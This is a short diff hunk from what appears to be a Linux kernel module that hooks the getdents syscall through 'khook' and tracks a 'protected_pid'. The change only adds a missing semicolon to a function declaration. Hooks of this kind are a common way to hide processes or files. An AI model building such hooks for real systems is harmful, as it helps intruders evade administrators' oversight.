@@ -94,7 +94,7 @@ int protected_pid = -1;
 // 　　}
 // 　　return NULL;
 // 　}
-static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
+static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
 static int print_pid(void)
 {
 	struct task_struct * task, * p;
